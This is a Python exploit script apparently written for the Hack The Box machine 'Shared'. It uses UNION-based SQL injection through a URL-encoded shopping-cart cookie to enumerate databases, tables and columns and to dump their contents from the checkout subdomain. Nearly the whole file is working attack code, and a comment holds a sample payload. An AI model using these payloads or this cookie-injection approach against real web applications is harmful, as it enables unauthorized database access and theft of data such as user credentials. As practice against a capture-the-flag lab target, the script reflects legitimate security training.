import argparse
import requests
import signal
import sys
import urllib.parse
import urllib3

# pip install beautifulsoup4 & pip instal lxml
from bs4 import BeautifulSoup
# pip3 install pwn
from pwn import *


# SQLi:
#	custom_cart = {"53GG2EF8' and false union select null,(select group_concat(0x7c, version(), 0x7c), null#":  "1"}

# global variables

domain_host = 'shared.htb'
subdomain_host = 'checkout'
target_host = f'https://{subdomain_host}.{domain_host}'

# disable TLS warnings

urllib3.disable_warnings()

# ctrl C

def def_handler(signal, frame):
	log.failure('Aborted!')
	exit()

signal.signal(signal.SIGINT, def_handler)

# inyection types

def get_databases():
	return """' and false union select null, (select group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata), null#"""

def get_tables(database):
	return f"""' and 1=0 union select null, (select group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema = '{database}'), null#"""

def get_columns(table):
	return f"""' and 0 union select null, (select group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_name = '{table}'), null#"""

def get_fields(column, table):
	return f"""' and 1>2 union select null, (select group_concat(0x7c, {column}, 0x7c) from {table}), null#"""

def get_info(query):
	return f"""' and 2=1 union select null, (select group_concat(0x7c, {query}, 0x7c)), null#"""

# selection of query types

def type_inyection(args):
    try:
        if len(sys.argv) == 1:
            return get_databases()
        elif args.database and args.table and args.column:
            return get_fields(args.column, args.table)
        elif args.database and args.table:
            return get_columns(args.table)
        elif args.database:
            return get_tables(args.database)
        elif args.query:
            return get_info(args.query)
    except Exception as e:
        print(e)


# request for inyection

def request(args):
	with requests.Session() as s:

		# select inyection type
		inyection = type_inyection(args)

		# Hummingbird printed t-shirt ID (cookie value)
		# add inyection
		product_id = f"""53GG2EF8{inyection}"""
		cookie_value = '{"' + product_id + '":"1"}'

		# urlencode cookie value
		urlcode_cookie = urllib.parse.quote(cookie_value)

		# create cookie
		malicious_cookie = { 
			"custom_cart" : urlcode_cookie
		}

		# inyect cookie
		r = s.get(f'{target_host}', cookies=malicious_cookie, verify=False)

		# show information
		soup = BeautifulSoup(r.text, 'lxml')
		print()
		print(soup.td.string)

# program flow

def main(args):
	request(args)

if __name__ == '__main__':

	# Help panel 
	parser = argparse.ArgumentParser(description='SQLi Shared HTB')
	
	parser.add_argument('-d', '--database', type=str, required=False, help='Select database')
	parser.add_argument('-t', '--table', type=str, required=False, help='Select table')
	parser.add_argument('-c', '--column', type=str, required=False, help='Select column')
	parser.add_argument('-q', '--query', type=str, required=False, help='One word query (g.e version())')

	args = parser.parse_args()

	# pass args object
	main(args)
